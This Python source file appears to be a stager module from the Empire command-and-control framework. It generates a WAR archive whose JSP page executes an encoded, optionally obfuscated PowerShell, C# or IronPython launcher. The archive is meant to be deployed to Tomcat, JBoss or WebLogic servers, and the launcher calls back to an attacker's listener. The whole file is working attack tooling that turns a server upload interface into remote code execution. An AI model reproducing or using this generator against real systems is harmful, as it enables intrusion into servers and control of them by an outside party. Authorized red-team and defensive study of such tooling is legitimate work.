import io
import logging
import zipfile

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "WAR",
            "Authors": [
                {
                    "Name": "Andrew Bonstrom",
                    "Handle": "@ch33kyf3ll0w",
                    "Link": "",
                }
            ],
            "Description": "Generates a Deployable War file.",
            "Comments": [
                "You will need to deploy the WAR file to activate. Great for interfaces that accept a WAR file such as Apache Tomcat, JBoss, or Oracle Weblogic Servers."
            ],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "csharp", "ironpython"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "AppName": {
                "Description": "Name for the .war/.jsp. Defaults to listener name.",
                "Required": False,
                "Value": "",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "empire.war",
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        app_name = self.options["AppName"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]

        obfuscate_script = False
        if obfuscate.lower() == "true":
            obfuscate_script = True

        if app_name == "":
            app_name = listener_name

        if language in ["csharp", "ironpython"]:
            if (
                self.mainMenu.listenersv2.get_active_listener_by_name(
                    listener_name
                ).info["Name"]
                != "HTTP[S]"
            ):
                log.error(
                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                )
                return ""

            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
                language=language,
                obfuscate=obfuscate,
                obfuscation_command=obfuscate_command,
                encode=True,
                listener_name=listener_name,
            )
        elif language == "powershell":
            launcher = self.mainMenu.stagergenv2.generate_launcher(
                listener_name,
                language=language,
                encode=True,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries=stager_retries,
            )

        if launcher == "":
            log.error("Error in launcher command generation.")
            return ""

        manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_35 (Sun Microsystems Inc.)\r\n\r\n"

        jsp_code = (
            '''<%@ page import="java.io.*" %>
<%
Process p=Runtime.getRuntime().exec("'''
            + str(launcher)
            + """");
%>
"""
        )

        wxml_code = f"""<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>{app_name}</servlet-name>
<jsp-file>/{app_name}.jsp</jsp-file>
</servlet>
</web-app>
"""

        war_file = io.BytesIO()
        zip_data = zipfile.ZipFile(war_file, "w", zipfile.ZIP_DEFLATED)

        zip_data.writestr("META-INF/MANIFEST.MF", manifest)
        zip_data.writestr("WEB-INF/web.xml", wxml_code)
        zip_data.writestr(f"{app_name}.jsp", jsp_code)
        zip_data.close()

        return war_file.getvalue()
